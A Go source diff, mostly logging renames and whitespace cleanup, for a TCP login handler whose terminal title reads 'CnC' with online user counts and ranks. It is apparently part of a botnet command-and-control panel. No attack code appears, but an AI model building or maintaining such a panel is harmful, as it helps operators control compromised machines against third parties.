@@ -3,6 +3,7 @@ package net
 import (
 	"api/core/database"
 	"api/core/models"
+	"api/core/models/log"
 	"api/core/net/commands"
 	"api/core/net/sessions"
 	"api/core/net/term"
@@ -20,7 +21,7 @@ func handler(conn net.Conn) {
 	//more
 	buf := make([]byte, 64)
 	if _, err := conn.Read(buf); err != nil {
-		logger.Println("Failed to read initial data: ", err)
+		log.Println("Failed to read initial data: ", err)
 		return
 	}
 	tm := term.New(conn)
@@ -49,7 +50,7 @@ func handler(conn net.Conn) {
 		time.Sleep(5 * time.Second)
 		conn.Close()
 	}
-	
+
 	if !user.IsKey([]byte(pass)) {
 		fmt.Fprintf(conn, "Invalid password...\r\n")
 		time.Sleep(5 * time.Second)
@@ -67,7 +68,7 @@ func handler(conn net.Conn) {
 	for _, session := range sessions.Sessions {
 		if session.User.Username == username {
 			fmt.Fprintf(conn, "Session Already Open!")
-			logger.Println(session.User.Username + " already has a session open!")
+			log.Println(session.User.Username + " already has a session open!")
 			return
 		}
 	}
@@ -83,23 +84,23 @@ func handler(conn net.Conn) {
 	}
 	//title
 	go func() {
-		i := 0 
-		
+		i := 0
+
 		for {
 			time.Sleep(time.Second)
-			
+
 			message := fmt.Sprintf("\033]0; [%s] %s CnC - Username [%s] - Online [%d] - Rank [%s] \007",
-			SpinnerChars[i%len(SpinnerChars)], models.Config.Name, Session.User.Username, sessions.Count(), role)
-			
+				SpinnerChars[i%len(SpinnerChars)], models.Config.Name, Session.User.Username, sessions.Count(), role)
+
 			if _, err := conn.Write([]byte(message)); err != nil {
 				if sessions.RemoveSession(Session.ID) {
-					logger.Println(Session.User.Username + " Session Closed!")
+					log.Println(Session.User.Username + " Session Closed!")
 				}
 				conn.Close()
 				break
 			}
-			
-			i++ 
+
+			i++
 		}
 	}()
 	commands.Commands["splash-home"].Exec(Session, nil)
@@ -118,5 +119,3 @@ func handler(conn net.Conn) {
 		}
 	}
 }
-
-
